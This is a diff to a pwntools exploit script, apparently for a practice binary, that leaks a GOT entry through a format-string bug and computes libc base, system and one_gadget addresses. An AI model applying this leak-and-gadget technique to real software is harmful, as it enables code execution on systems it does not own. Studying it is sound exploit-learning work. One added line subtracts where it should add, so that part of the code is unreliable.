@@ -1,8 +1,9 @@
 from pwn import *  # NOQA
+context.arch = 'amd64'
+context.terminal = ['tmux', 'splitw', '-h']
 
 p = process('./example05')
 gdb.attach(p)
-context.arch = 'amd64'
 
 p.sendline('%7$p')
 p.recvuntil('Hello ')
@@ -10,32 +11,30 @@ line = p.recvline()
 random_num = str(int(line[2:10], 16))
 p.sendline(random_num)
 
-# p.sendline('%11$p') # Return addr
-# p.sendline('AAAAAAAA %8$p') # Print my input
+# p.sendline('AAAAAAAA %8$p') # Prints our input as a pointer.
 binary = ELF('./example05')
-libc = ELF('/nix/store/7p1v1b6ys9fydg5kdqvr5mpr8svhwf4p-glibc-2.31/lib/libc.so.6')
-one_gadget_offset = 0xc751d
-
-# libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
-# one_gdaget_offset = 0xe6ce9
+libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+one_gadget_offset = 0x10a45c
 
 # Note that null bytes will be read, but not printed.
 
-# print(hex(binary.symbols['got.printf']))
-p.sendline(b'%9$s    ' + p64(binary.symbols['got.printf']))  # Leak my input
+print(hex(binary.symbols['got.setvbuf']))
+p.sendline(b'%9$s    ' + p64(binary.symbols['got.setvbuf']))  # Leak my input
+
 leak = p.recvuntil(b'    ')[:-4]
 p.recv()
-printf_addr = u64(leak.ljust(8, b'\x00'))
-print('printf', hex(printf_addr))
+setvbuf_addr = u64(leak.ljust(8, b'\x00'))
+print('setvbuf', hex(setvbuf_addr))
 
-libc_base = printf_addr - libc.symbols['printf']
+libc_base = setvbuf_addr - libc.symbols['setvbuf']
+printf_addr = libc_base - libc.symbols['printf']
 system_addr = libc_base + libc.symbols['system']
 onegadget_addr = libc_base + one_gadget_offset
 print('libc base', hex(libc_base))
 print('system', hex(system_addr))
 print('one_gadget', hex(onegadget_addr))
 
-# fmtstr_payload() pwntools
+# fmtstr_payload() pwntools also nice.
 
 for i in range(6):
     print(p64(onegadget_addr)[i])
